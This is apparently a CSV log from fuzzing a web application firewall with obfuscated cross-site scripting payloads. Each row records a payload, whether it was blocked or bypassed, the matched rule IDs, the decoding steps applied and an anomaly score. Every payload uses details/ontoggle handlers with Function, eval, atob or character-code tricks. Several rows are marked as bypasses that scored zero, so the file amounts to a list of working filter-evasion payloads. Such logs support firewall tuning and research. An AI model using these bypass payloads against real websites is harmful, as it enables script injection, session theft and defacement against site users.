914,"<details open ontoggle=""Function['constructor'](atob('YWxlcnQoMSk='))()"">",0,1,block,4,"933210,941100,941120,949110","o32,39v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603395430.002480
920,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603396085.554719
921,"<details open ontoggle=""Function(atob('YWxlcnQoMSk='))()""></details>",0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760339612.867538
922,"<details open ontoggle=""new Function(atob`YWxlcnQoMSk=`)()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603396260.849004
925,"<details open ontoggle=""new Function(window.atob('YWxlcnQoMSk='))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603396561.963366
926,"<details open ontoggle=""new Function(self.atob('YWxlcnQoMSk='))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760339665.424897
928,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='.concat()))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603396845.156303
929,"<details open ontoggle=""new Function(atob(String.fromCharCode(89,87,120,108,99,110,81,111,77,83,107,61)))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,119 || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603396924.153511
930,"<details open ontoggle=""new Function(atob(['YWxlcnQoMSk='][0]))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603397022.646660
931,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='),)()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,73 || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603397169.655957
933,"<details open ontoggle=""new&#09;Function(atob('YWxlcnQoMSk='))()""></details>",0,1,bypass,2,"941100,941120","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760339735.546765
935,"<details open ontoggle=""new/**/Function(atob('YWxlcnQoMSk='))()""></details>",0,1,bypass,2,"941100,941120","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603397542.588034
936,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='))/***/()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603397616.003089
937,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk='.toString()))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603397754.439313
940,"<details open ontoggle=""new Function(atob('YWxlcnQoMjIp'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603398045.674872
941,"<details open ontoggle=""Function['constructor'](atob('YWxlcnQoMjIp'))()""></details>",0,1,block,4,"933210,941100,941120,949110","o32,39v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603398114.556977
943,"<details open ontoggle=""new Function(window.atob('YWxlcnQoMjIp'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603398321.156989
944,"<details open ontoggle=""(()=>new Function(atob('YWxlcnQoMjIp'))())()""></details>",0,1,block,5,"933210,934100,941100,941120,949110","o41,27v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || o29,13v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603398489.954340
945,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,50,50,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603398598.792169
949,"<details open ontoggle=""new Function(atob`YWxlcnQoMjIp`)()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603398988.647214
950,"<details open ontoggle=""Function(atob('YWxlcnQoMjIp'))()""></details>",0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603399085.651514
951,"<details open ontoggle=""window['Function'](atob('YWxlcnQoMjIp'))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o30,36v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,78t:urlDecodeUni,t:compressWhitespace || ",20,177603399184.061090
953,"<details open ontoggle=""top['Function'](atob('YWxlcnQoMjIp'))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,36v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,75t:urlDecodeUni,t:compressWhitespace || ",20,177603399360.722818
954,"<details open ontoggle=""self['Function'](atob('YWxlcnQoMjIp'))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o28,36v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,76t:urlDecodeUni,t:compressWhitespace || ",20,177603399456.172033
955,"<details open ontoggle=""parent['Function'](atob('YWxlcnQoMjIp'))()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,36v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603399556.292119
956,"<details open ontoggle=""globalThis['Function'](atob('YWxlcnQoMjIp'))()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,36v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603399678.105297
960,"<details open ontoggle=""new Function(atob('YWxlcnQoOCk='))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603400078.356984
961,"<details open ontoggle=""Function(atob('YWxlcnQoOCk='))()""></details>",0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603400187.997121
962,"<details open ontoggle=""(function(){return Function(atob('YWxlcnQoOCk='))})()()""></details>",0,1,block,4,"934100,941100,941120,949110","o25,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760340025.591233
965,"<details open ontoggle=""new Function(window.atob('YWxlcnQoOCk='))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603400526.927837
967,"<details open ontoggle=""new&#9;Function(atob('YWxlcnQoOCk='))()""></details>",0,1,bypass,2,"941100,941120","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603400888.645426
968,"<details open ontoggle=""new&#10;Function(atob('YWxlcnQoOCk='))()""></details>",0,1,bypass,2,"941100,941120","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603400924.960801
969,"<details open ontoggle=""new Function(atob('YWxlcnQoOCk='.concat()))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603401072.556851
970,"<details open ontoggle=""new Function(atob('YWxlcnQoOCk='))&#x28;&#x29;""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603401143.795006
972,"<details open ontoggle=""new Function(atob(['YWxlcnQoOCk='].join()))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603401344.763935
973,"<details open ontoggle=""new Function(atob(String.fromCharCode(89,87,120,108,99,110,81,111,79,67,107,61)))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,119 || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603401453.038037
975,"<details open ontoggle=""new Function(self.atob('YWxlcnQoOCk='))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,77 || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760340169.410704
977,"<details open ontoggle=""new/**/Function(atob('YWxlcnQoOCk='))()""></details>",0,1,bypass,2,"941100,941120","v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603401848.064409
978,"<details open ontoggle=""new Function(atob('YWxlcnQoOCk='))(/**/)""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,76 || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603401953.736277
979,"<details open ontoggle=""new Function(atob(unescape('YWxlcnQoOCk%3D')))()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,84 || o24,13v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603402099.766845
980,"<details open ontoggle=""setTimeout(function(){eval(String['fromCharCode'](97,108,101,114,116,40,49,41))},0)"">",0,1,block,7,"932100,933160,933210,934100,941100,941120,949110","o43,7v217,109 || o46,61v217,109 || o34,73v217,109t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603402120.089440
981,"<details open ontoggle=""setTimeout(function(){eval(atob('YWxlcnQoMSk='))},0)"">",0,1,block,6,"932100,933160,934100,941100,941120,949110","o43,7v217,78 || o46,30v217,78 || o35,11v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760340225.604904
982,"<details open ontoggle=""setTimeout(function(){window['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))},0)"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o34,80v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,14v217,116t:urlDecodeUni,t:compressWhitespace || ",25,177603402366.665211
984,"<details open ontoggle=""setTimeout(function(){eval(String.fromCodePoint(97,108,101,114,116,40,49,41))},0)"">",0,1,block,6,"932100,933160,934100,941100,941120,949110","o43,7v217,107 || o46,59v217,107 || o35,11v217,107 || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603402560.428125
985,"<details open ontoggle=""setTimeout(function(){(1,eval)(String.fromCharCode(97,108,101,114,116,40,49,41))},0)"">",0,1,block,5,"933210,934100,941100,941120,949110","o34,74v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603402692.775104
986,"<details open ontoggle=""setTimeout(function(){self['eval'](String['fromCharCode'](97,108,101,114,116,40,49,41))},0)"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o34,81v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,117 || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,12v217,117t:urlDecodeUni,t:compressWhitespace || ",25,177603402718.760965
987,"<details open ontoggle=""setTimeout(function(){globalThis['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))},0)"">",0,1,block,5,"933210,934100,941100,941120,949110","o34,84v217,120t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,120 || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603402883.662057
988,"<details open ontoggle=""setTimeout(function(){eval(unescape('%61%6c%65%72%74%28%31%29'))},0)"">",0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o43,7v217,94 || o46,46v217,94 || o35,11v217,94 || o35,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603402922.160889
990,"<details open ontoggle=""setTimeout(function(){top['eval'](String.fromCharCode(97,108,101,114,116,40,49,41))},0)"">",0,1,block,7,"932105,933210,934100,941100,941120,941370,949110","o43,6v217,113 || o34,77v217,113t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,113 || v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,11v217,113t:urlDecodeUni,t:compressWhitespace || ",30,177603403148.761194
991,"<details open ontoggle=""setTimeout(function(){eval(decodeURI('%61%6C%65%72%74%28%31%29'))},0)"">",0,1,block,7,"932100,933160,934100,934100,941100,941120,949110","o43,7v217,95 || o46,47v217,95 || o35,11v217,95 || o35,11v217,95t:urlDecodeUni || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603403288.541632
993,"<details open ontoggle=""setTimeout(function(){with(String)eval(fromCharCode(97,108,101,114,116,40,49,41))},0)"">",0,1,block,5,"933160,934100,941100,941120,949110","o58,51v217,111 || o35,11v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603403487.004805
994,"<details open ontoggle=""setTimeout(function(){this['eval'](String['fromCharCode'](97,108,101,114,116,40,49,41))},0)"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o34,81v217,117t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,117 || v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,12v217,117t:urlDecodeUni,t:compressWhitespace || ",25,177603403557.223007
995,"<details open ontoggle=""setTimeout(function(){eval(`${String.fromCharCode(97,108,101,114,116)}(1)`)},0)"">",0,1,block,8,"932100,932130,933160,933180,934100,941100,941120,949110","o43,7v217,105 || o51,48v217,105t:urlDecodeUni,t:cmdLine || o46,57v217,105 || o52,51v217,105 || o35,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603403630.841876
996,"<details open ontoggle=""setTimeout(function(){(0,eval)(String.fromCharCode(97,108,101,114,116,40,49,41))},0)"">",0,1,block,5,"933210,934100,941100,941120,949110","o34,74v217,110t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603403714.191444
999,"<details open ontoggle=""setTimeout(function(){eval(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))},0)"">",0,1,block,6,"932100,933160,934100,941100,941120,949110","o43,7v217,118 || o46,70v217,118 || o35,11v217,118 || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603404056.543642
1000,"<details open ontoggle=""setTimeout(function(){with(document)with(body)appendChild(createElement('script')).text='al\\u0065rt(1)';},0)""><summary>x</summary></details>",0,1,block,4,"934100,941100,941120,949110","o35,11v217,165 || v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,165t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603404287.925326
1004,"<details open ontoggle=""setTimeout(function(){document['body']['appendChild'](document['createElement']('script'))['text']='al\\u0065rt(1)'},0)"">",0,1,block,6,"933210,934100,941100,941120,941370,949110","o34,109v217,145t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,145 || v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,145t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o46,16v217,145t:urlDecodeUni,t:compressWhitespace || ",25,177603404644.305884
1005,"<details open ontoggle=""setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)"">",0,1,block,6,"932100,933160,934100,941100,941120,949110","o43,7v217,106 || o46,58v217,106 || o35,11v217,106 || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603404789.975985
1006,"<details open ontoggle=""setTimeout(function(){[].constructor.constructor('al\\u0065rt(1)')()},0)"">",0,1,block,5,"933210,934100,941100,941120,949110","o85,11v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603404823.659119
1014,"<details open ontoggle=""setTimeout(function(){location='javascript:al\\u0065rt(1)'},0)"">",0,1,block,7,"934100,941100,941120,941140,941170,941210,949110","o35,11v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,45v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o55,22v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o56,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603405671.056428
1016,"<details open ontoggle=""setTimeout(function(){document.location='javascript:al\\u0065rt(1)'},0)"">",0,1,block,7,"934100,941100,941120,941140,941170,941210,949110","o35,11v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o22,54v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o64,22v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o65,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603405823.211341
